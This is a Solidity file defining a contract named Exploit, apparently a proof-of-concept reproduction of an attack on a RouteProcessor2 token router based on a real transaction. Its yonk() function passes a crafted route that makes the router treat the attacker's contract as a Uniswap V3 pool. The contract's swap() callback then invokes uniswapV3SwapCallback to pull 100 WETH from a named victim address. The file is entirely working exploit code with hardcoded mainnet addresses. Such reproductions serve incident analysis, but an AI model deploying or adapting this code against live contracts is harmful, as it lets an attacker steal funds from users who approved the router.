// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./interfaces/IRouteProcessor2.sol";
import "../lib/forge-std/src/console.sol";

contract Exploit {
    IRouteProcessor2 rp;

    constructor(IRouteProcessor2 _rp) {
        rp = _rp;
    }

    function yonk() external {
        // based on the payload for txn: 0xb8f57cf82b7057d9d03f1500e3f0ce46980388c3b13ff317f1c617d932313386
        bytes memory route = abi.encodePacked(
            uint8(1), // command code
            0x514910771AF9Ca656af840dff83E8264EcF986CA, // token
            uint8(1), // num
            uint16(0), // share
            uint8(1), // poolType -- will call swapUniV3
            address(this), // pool - set this contract address as the pool
            false, // zeroForOne
            0x0000000000000000000000000000000000000000 // recipient - can be 0
        );

        rp.processRoute(
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // tokenIn
            0, // amountIn
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, // tokenOut
            0, // amountOutMin
            0x0000000000000000000000000000000000000000, // to
            route // route
        );
    }

    /**
     * @notice external call from routeProcessor2 when we call yonk
     */
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        // based on the payload for txn: 0xb8f57cf82b7057d9d03f1500e3f0ce46980388c3b13ff317f1c617d932313386
        bytes memory payload = abi.encode(
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // tokenIn: WETH
            0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1 // from: sifuvision.eth
        );

        rp.uniswapV3SwapCallback(
            100000000000000000000, // amount0Delta
            0, // amount1Delta
            payload
        );

        return (0, 0);
    }
}
